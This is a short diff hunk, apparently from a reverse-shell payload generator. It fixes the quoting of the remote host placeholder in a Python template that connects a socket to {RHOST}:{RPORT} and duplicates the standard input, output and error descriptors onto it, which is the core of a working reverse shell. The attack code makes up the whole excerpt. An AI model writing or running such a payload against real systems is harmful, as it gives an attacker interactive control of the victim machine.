@@ -57,7 +57,7 @@ import pty
 import socket
 
 sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect(({RHOST}, {RPORT}))
+sock.connect(({RHOST!r}, {RPORT}))
 
 for descriptor in (0, 1, 2):
     os.dup2(sock.fileno(), descriptor)
